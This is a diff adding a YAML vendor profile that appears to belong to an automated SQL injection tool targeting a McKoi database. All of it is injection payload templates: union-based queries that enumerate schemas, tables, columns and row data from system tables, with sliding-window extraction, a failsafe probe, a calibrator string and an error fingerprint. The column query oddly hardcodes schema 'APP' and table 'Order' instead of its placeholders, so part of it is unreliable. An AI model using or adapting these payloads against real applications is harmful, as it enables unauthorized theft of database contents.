@@ -1,0 +1,112 @@
+vendor: ""
+resource: 
+ info: |
+  SELECT 
+      '-'
+      || '${ENCLOSE_VALUE_SQL}'
+      || '-'
+      || '${ENCLOSE_VALUE_SQL}'
+      || user()
+      || '${TRAIL_SQL}' 
+      r
+ schema: 
+  database: |
+   select 
+       rr
+       || '${TRAIL_SQL} '
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || t.s
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from 
+           (select name s from SYS_INFO.sUSRSchemaInfo) t,
+           (select name s from SYS_INFO.sUSRSchemaInfo) t1
+       where t.s >= t1.s
+       group by t.s
+       {limit}
+   ) a
+  table: |
+   select 
+       rr
+       || '${TRAIL_SQL} '
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || t.s
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' 
+           rr
+       from 
+           (select name s from SYS_INFO.sUSRTableInfo where \"schema\" = '${DATABASE}') t,
+           (select name s from SYS_INFO.sUSRTableInfo where \"schema\" = '${DATABASE}') t1
+       where t.s >= t1.s
+       group by t.s
+       {limit}
+   ) a
+  column: |
+   select 
+       rr
+       || '${TRAIL_SQL} '
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || t.s
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}' 
+           rr
+       from 
+           (select \"column\" s from SYS_INFO.sUSRTableColumns where \"schema\" = 'APP' and \"table\" = 'Order') t,
+           (select \"column\" s from SYS_INFO.sUSRTableColumns where \"schema\" = 'APP' and \"table\" = 'Order') t1
+       where t.s >= t1.s
+       group by t.s
+       {limit}
+   ) a
+  row: 
+   query: |
+    select 
+        rr
+        || '${TRAIL_SQL} '
+        r
+    from (
+        select 
+            '${ENCLOSE_VALUE_SQL}'
+            || t.s
+            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            rr
+        from
+            (select distinct ${FIELDS} s from \"${DATABASE}\".\"${TABLE}\") t,
+            (select distinct ${FIELDS} s from \"${DATABASE}\".\"${TABLE}\") t1
+        where t.s >= t1.s
+        group by t.s
+        {limit}
+    ) a
+   fields: 
+    field: "trim(coalesce(${FIELD}, ''))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   '${LEAD}'
+   ||substring(
+       r,
+       ${INDEX},
+       65536
+   ) rrr
+   from (
+       ${INJECTION}
+   )
+  limit: "having count(*) between ${LIMIT} and ${LIMIT}"
+  failsafe: "select cast(x.rrr as char)rr from (select 1337${INDICE}7330%2b1 rrr)x"
+  calibrator: "'%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23'"
+  limitBoundary: 1
+  endingComment: ""
+  fingerprint: 
+   errorMessage: 
+    - mckoi
+ normal: 
+  indices: "union all select rr from (${INDICE_UNIQUE})b"
+  capacity: "'${LEAD}${INDICE}' || ${CALIBRATOR}"
+  orderBy: "order by 1337"
